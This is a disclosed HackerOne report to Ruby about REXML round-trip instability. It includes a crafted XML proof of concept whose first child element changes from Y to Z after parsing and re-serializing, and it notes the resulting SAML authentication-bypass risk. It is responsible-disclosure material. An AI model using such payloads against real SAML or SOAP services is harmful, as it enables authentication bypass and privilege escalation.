---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1104077'
original_report_id: '1104077'
title: Round-trip instability in REXML
team_handle: ruby
created_at: '2021-02-16T08:10:08.579Z'
disclosed_at: '2021-04-15T09:44:48.486Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 20
tags:
- hackerone
---

# Round-trip instability in REXML

## Metadata

- HackerOne Report ID: 1104077
- Weakness: 
- Program: ruby
- Disclosed At: 2021-04-15T09:44:48.486Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

**Submitted previously via email to security@ruby-lang.org due to REXML not being listed under in-scope assets here. Explicitly requested by @hsbt to re-submit through HackerOne.**

**CVSS rating calculated based on confirmed downstream impact.**

---

Hi Ruby Security Team,

I'm reaching out to you to report a vulnerability in REXML that renders downstream use-cases susceptible to varying degrees of tampering.

Conceptually the vulnerability is similar to Go encoding/xml bugs publicly disclosed in December. For context, high-level descriptions of those vulnerabilities can be found in the blog post at https://mattermost.com/blog/coordinated-disclosure-go-xml-vulnerabilities/ and in the advisories it references.

In the case of REXML, the specific vulnerability is best explained using a code example:

```Ruby
require 'rexml/document'

doc = REXML::Document.new <<XML
<!DOCTYPE x [ <!NOTATION x SYSTEM 'x">]><!--'> ]>
<X>
  <Y/><![CDATA[--><X><Z/><!--]]>-->
</X>
XML

puts "First child in original doc: " + doc.root.elements[1].name
doc = REXML::Document.new doc.to_s
puts "First child after round-trip: " + doc.root.elements[1].name
```

This program prints two lines of text:

```
First child in original doc: Y
First child after round-trip: Z
```

The output demonstrates how the structure of an XML document can change when parsed and serialized using REXML. The expected output from a well-behaving parser would be such where both lines end with "Y".

Regards,

Juho Nurminen
Staff Product Security Engineer, Mattermost, Inc.

## Impact

The impact of XML round-trip issues can vary significantly depending on context. SAML implementations affected by such issues can allow authentication bypasses and privilege escalation. SOAP endpoints can allow circumventing business logic or access controls. And in general XML processing loses integrity guarantees.

**We are aware of a major SAML implementation affected by this vulnerability**, resulting in critical impact in all applications that rely on it. The vulnerability has not been reported to the downstream maintainers since it is an issue in REXML.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
